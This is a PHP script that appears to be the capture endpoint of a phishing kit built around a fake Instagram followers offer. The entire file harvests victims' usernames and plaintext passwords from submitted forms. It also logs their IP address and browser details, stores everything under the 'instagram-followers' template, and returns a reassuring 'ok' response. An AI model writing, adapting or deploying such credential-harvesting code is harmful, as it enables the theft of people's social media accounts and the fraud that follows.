<?php
require_once '../../config.php';

$username = '';
foreach (['username', 'user', 'login', 'uname'] as $field) {
    if (!empty($_POST[$field])) { $username = $_POST[$field]; break; }
}

$password = '';
foreach (['password', 'pass', 'passwd', 'pwd'] as $field) {
    if (!empty($_POST[$field])) { $password = $_POST[$field]; break; }
}

$followers = $_POST['followers'] ?? 'unknown';

$template = 'instagram-followers';
$ip = getClientIP();
$agent = sanitize($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown');

saveCapture([
    'username'   => sanitize($username),
    'password'   => $password,
    'followers'  => sanitize($followers),
    'ip_address' => $ip,
    'user_agent' => $agent,
    'template'   => $template
]);

header('Content-Type: application/json');
echo json_encode(['status' => 'ok']);
exit;
